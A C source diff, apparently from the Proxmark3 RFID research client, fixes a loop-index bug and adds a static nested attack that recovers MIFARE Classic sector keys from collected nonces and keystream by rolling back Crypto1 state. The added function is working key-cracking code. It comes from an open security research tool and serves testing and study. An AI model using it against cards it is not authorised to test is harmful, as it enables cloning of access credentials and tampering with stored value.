@@ -470,7 +470,7 @@ int mfnested(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo,
 
         for (int j = 0; j < size; j++) {
             crypto1_get_lfsr(statelists[0].head.slhead + i, &key64);
-            num_to_bytes(key64, 6, keyBlock + i * 6);
+            num_to_bytes(key64, 6, keyBlock + j * 6);
         }
 
         if (mfCheckKeys(statelists[0].blockNo, statelists[0].keyType, false, size, keyBlock, &key64) == PM3_SUCCESS) {
@@ -498,6 +498,137 @@ out:
     return -4;
 }
 
+int mfStaticNested(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo, uint8_t trgKeyType, uint8_t *resultKey) {
+    uint16_t i;
+    uint32_t uid;
+    StateList_t statelists[1];
+    struct Crypto1State *p1, *p3;
+
+    struct {
+        uint8_t block;
+        uint8_t keytype;
+        uint8_t target_block;
+        uint8_t target_keytype;
+        uint8_t key[6];
+    } PACKED payload;
+    payload.block = blockNo;
+    payload.keytype = keyType;
+    payload.target_block = trgBlockNo;
+    payload.target_keytype = trgKeyType;
+    memcpy(payload.key, key, sizeof(payload.key));
+
+    PacketResponseNG resp;
+    clearCommandBuffer();
+    SendCommandNG(CMD_HF_MIFARE_STATIC_NESTED, (uint8_t *)&payload, sizeof(payload));
+
+    if (!WaitForResponseTimeout(CMD_HF_MIFARE_STATIC_NESTED, &resp, 2000))
+        return PM3_ETIMEOUT;
+
+    if (resp.status != PM3_SUCCESS)
+        return resp.status;
+
+    struct p {
+        int16_t isOK;
+        uint8_t block;
+        uint8_t keytype;
+        uint8_t cuid[4];
+        uint8_t nt[4];
+        uint8_t ks[4];
+    } PACKED;
+    struct p *package = (struct p *)resp.data.asBytes;
+
+    // error during collecting static nested information
+    if (package->isOK == 0) return PM3_EUNDEF;
+
+    memcpy(&uid, package->cuid, sizeof(package->cuid));
+
+    statelists[0].blockNo = package->block;
+    statelists[0].keyType = package->keytype;
+    statelists[0].uid = uid;
+
+    memcpy(&statelists[0].nt_enc,  package->nt, sizeof(package->nt));
+    memcpy(&statelists[0].ks1, package->ks, sizeof(package->ks));
+
+    // calc keys
+    pthread_t t;
+
+    // create and run worker thread
+    pthread_create(&t, NULL, nested_worker_thread, &statelists[0]);
+
+    // wait for thread to terminate:
+    pthread_join(t, (void *)&statelists[0].head.slhead);
+
+    // the first 16 Bits of the cryptostate already contain part of our key.
+    p1 = p3 = statelists[0].head.slhead;
+
+    // create key candidates.
+    while (p1 <= statelists[0].tail.sltail) {
+            struct Crypto1State savestate;
+            savestate = *p1;
+            while (Compare16Bits(p1, &savestate) == 0 && p1 <= statelists[0].tail.sltail) {
+                *p3 = *p1;
+                lfsr_rollback_word(p3, statelists[0].nt_enc ^ statelists[0].uid, 0);
+                p3++;
+                p1++;
+            }
+    }
+
+    *(uint64_t *)p3 = -1;
+    statelists[0].len = p3 - statelists[0].head.slhead;
+    statelists[0].tail.sltail = --p3;
+
+    uint32_t keycnt = statelists[0].len;
+    if (keycnt == 0) goto out;
+
+    PrintAndLogEx(SUCCESS, "Found %3u candidate keys", keycnt);
+  
+    memset(resultKey, 0, 6);
+    uint64_t key64 = -1;
+
+    // The list may still contain several key candidates. Test each of them with mfCheckKeys
+    uint32_t max_keys_slice = keycnt > KEYS_IN_BLOCK ? KEYS_IN_BLOCK : keycnt;
+    uint8_t keyBlock[PM3_CMD_DATA_SIZE] = {0x00};
+       
+    for (i = 0; i < keycnt; i += max_keys_slice) {
+
+        PrintAndLogEx(INFO, "Testing %u/%u ", i, keycnt);
+
+        key64 = 0;
+
+        int size = keycnt - i > max_keys_slice ? max_keys_slice : keycnt - i;
+
+        // copy x keys to device.
+        for (int j = 0; j < size; j++) {
+            crypto1_get_lfsr(statelists[0].head.slhead + i + j, &key64);
+            num_to_bytes(key64, 6, keyBlock + j * 6);
+        }
+
+        // check a block of generated candidate keys.
+        if (mfCheckKeys(statelists[0].blockNo, statelists[0].keyType, false, size, keyBlock, &key64) == PM3_SUCCESS) {
+
+            free(statelists[0].head.slhead);
+
+            num_to_bytes(key64, 6, resultKey);
+
+            PrintAndLogEx(SUCCESS, "target block:%3u key type: %c  -- found valid key [  " _YELLOW_("%s") "]",
+                          package->block,
+                          package->keytype ? 'B' : 'A',
+                          sprint_hex(resultKey, 6)
+                         );
+            return PM3_SUCCESS;
+        }
+    }
+
+out:
+    PrintAndLogEx(SUCCESS, "target block:%3u key type: %c",
+                  package->block,
+                  package->keytype ? 'B' : 'A'
+                 );
+
+    free(statelists[0].head.slhead);
+
+    return PM3_ESOFT;
+}
 
 // MIFARE
 int mfReadSector(uint8_t sectorNo, uint8_t keyType, uint8_t *key, uint8_t *data) {
